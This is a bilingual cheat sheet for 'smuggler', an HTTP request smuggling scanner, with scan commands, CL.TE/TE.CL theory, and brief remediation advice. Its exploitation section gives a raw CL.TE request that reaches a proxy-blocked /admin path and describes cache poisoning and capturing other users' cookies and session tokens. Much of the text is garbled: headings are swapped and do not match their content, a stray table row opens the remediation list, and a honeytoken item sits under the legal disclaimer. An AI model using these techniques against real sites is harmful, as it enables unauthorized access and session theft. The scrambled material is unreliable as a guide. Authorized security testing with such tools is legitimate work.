# 📦 smuggler 完整速查表

<!-- language-home-navigation -->
[🏠 中文首页](../../README.zh-CN.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](./README.tr.md) • [🇬🇷 Ελληνικά](./README.el.md)



```
  ███████╗███╗   ███╗██╗   ██╗ ██████╗  ██████╗ ██╗     ███████╗██████╗ 
  ██╔════╝████╗ ████║██║   ██║██╔════╝ ██╔════╝ ██║     ██╔════╝██╔══██╗
  ███████╗██╔████╔██║██║   ██║██║  ███╗██║  ███╗██║     █████╗  ██████╔╝
  ╚════██║██║╚██╔╝██║██║   ██║██║   ██║██║   ██║██║     ██╔══╝  ██╔══██╗
  ███████║██║ ╚═╝ ██║╚██████╔╝╚██████╔╝╚██████╔╝███████╗███████╗██║  ██║
  ╚══════╝╚═╝     ╚═╝ ╚═════╝  ╚═════╝  ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝
             High-Performance HTTP Request Smuggling Scanner
```

<p align="center">
  <img src="https://img.shields.io/badge/smuggler-HTTP_Smuggling-blue?style=for-the-badge" alt="smuggler">
  <img src="https://img.shields.io/badge/Author-Evan_Ricaurte-orange?style=for-the-badge" alt="defparam">
  <img src="https://img.shields.io/badge/Category-Web_Security_&_API-green?style=for-the-badge" alt="Web Security">
  <img src="https://img.shields.io/badge/License-MIT-purple?style=for-the-badge" alt="MIT">
</p>

<p align="center">
  <b>📦 Ultra-fast, modular Python tool designed to detect and verify HTTP Request Smuggling vulnerabilities (CL.TE, TE.CL, and header mutation desyncs) across modern web infrastructure</b>
</p>

---

## 📋 目录

- [简介](#-overview--http-smuggling-theory)
  - [CL.TE vs TE.CL Discrepancies](#clte-vs-tecl-discrepancies)
- [安装](#-installation)
- [Basic Target Scanning](#-basic-target-scanning)
- [Scan Configurations & Mutation Engines](#-scan-configurations--mutation-engines)
  - [By default, smuggler tests for both `CL.TE` and `TE.CL` behaviors using safe timing payloads.](#default-vs-exhaustive-scan)
  - [Smuggler includes different payload profiles:](#custom-headers--cookies)
- [Multi-Target & Pipeline Scanning](#-multi-target--pipeline-scanning)
- [Analyzing Results & Exploitation Paths](#-analyzing-results--exploitation-paths)
  - [Cache Poisoning via Smuggling](#cache-poisoning-via-smuggling)
  - [When smuggler reports a positive match:](#bypassing-front-end-security-controls)
  - [Smuggle a request that generates an off-site redirect (e.g. Host header manipulation) to poison web caches serving JavaScript libraries to all users.](#hijacking-other-users-requests)
- [快速参考](#-quick-reference-table)
- [Defensive Considerations & Remediation](#-defensive-considerations--remediation)
- [Legal Disclaimer](#-legal-disclaimer)

---

## 🎯 简介

[Legal Disclaimer](#-legal-disclaimer)

### CL.TE vs TE.CL Discrepancies
- **CL.TE**: Front-end uses `Content-Length`, back-end uses `Transfer-Encoding: chunked`.
- **TE.CL**: Front-end uses `Transfer-Encoding: chunked`, back-end uses `Content-Length`.
- **TE.TE**: Both support `Transfer-Encoding`, but one can be tricked into ignoring it via header obfuscation (e.g., `Transfer-Encoding: xchunked`, tabs, or line folding).

Created by **defparam (Evan Ricaurte)**, **smuggler** injects carefully crafted payloads to observe timing delays or desynchronization responses without breaking backend service stability.

---

## 📥 安装

```bash
# Clone the repository
git clone https://github.com/defparam/smuggler.git
cd smuggler

# Run using Python 3
python3 smuggler.py -h
```

---

## 🚀 Basic Target Scanning

Scan a single web application endpoint:

```bash
# Basic scan against a single target
python3 smuggler.py -u https://target.com/
```

🚀 Basic Target Scanning

---

## ⚙️ Scan Configurations & Mutation Engines

### By default, smuggler tests for both `CL.TE` and `TE.CL` behaviors using safe timing payloads.
Smuggler includes different payload profiles:
- **Default profile**: Fast, common desync mutations.
- **Exhaustive profile**: Comprehensive mutations testing whitespace variations, multiple headers, and obfuscated transfer-encoding headers:

```bash
# Run exhaustive scan testing all mutation gadgets
python3 smuggler.py -u https://target.com/ -c exhaustive
```

### Smuggler includes different payload profiles:
Default profile**: Fast, common desync mutations.
```bash
python3 smuggler.py -u https://target.com/api/ \
  -H "Cookie: session=xyz123" \
  -H "X-Forwarded-Host: target.com"
```

---

## 🌐 Multi-Target & Pipeline Scanning

Pipe endpoints discovered from `httpx` or `subfinder` directly into smuggler:

```bash
# Scan a list of URLs from file
python3 smuggler.py -f live_hosts.txt -t 10

# Adjust timeout per probe (default: 10s)
python3 smuggler.py -u https://target.com/ --timeout 5
```

---

## 💥 Analyzing Results & Exploitation Paths

When smuggler reports a positive match:
```text
[CRITICAL] CL.TE Desync Detected: https://target.com/
```

### Cache Poisoning via Smuggling
Smuggle a request that generates an off-site redirect (e.g. Host header manipulation) to poison web caches serving JavaScript libraries to all users.

### When smuggler reports a positive match:
If the front-end proxy blocks `/admin`, smuggle a secondary internal request that reaches the back-end directly without proxy inspection:
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 48
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
```

### Smuggle a request that generates an off-site redirect (e.g. Host header manipulation) to poison web caches serving JavaScript libraries to all users.
Smuggle a prefix of an HTTP request. When the next user sends their request, it gets appended to your smuggled request, exposing their cookies and session tokens.

---

## ⚡ 快速参考

|Objective|命令|
|-----------|---------|
|**Quick Single Target**|`python3 smuggler.py -u https://target.com/`|
|**Exhaustive Deep Scan**|`python3 smuggler.py -u https://target.com/ -c exhaustive`|
|**Scan Target List**|`python3 smuggler.py -f targets.txt -t 15`|
|**Custom Headers/Cookies**|`python3 smuggler.py -u <URL> -H "Cookie: sess=123"`|
|**Custom Timeout**|`python3 smuggler.py -u <URL> --timeout 15`|

---

## 🛡️ Defensive Considerations & Remediation

|**Custom Timeout**|`python3 smuggler.py -u <URL> --timeout 15`|
2. **Normalize HTTP Headers:** Configure reverse proxies to reject requests containing both `Content-Length` and `Transfer-Encoding`.
3. **Drop Ambiguous Mutations:** Drop requests with obfuscated `Transfer-Encoding` headers (e.g., spaces before colon, multiple values).

---

## ⚠️ Legal Disclaimer

3. **Honeytokens:** Plant attractive DNS records (e.g., `backup-vault.corp.local` or `admin-portal.corp.local`) pointing to honeypot IP addresses.
> HTTP Request Smuggling can disrupt live backend queues and poison shared caching nodes. smuggler must be used exclusively on explicitly authorized test targets with strict permission from asset owners.
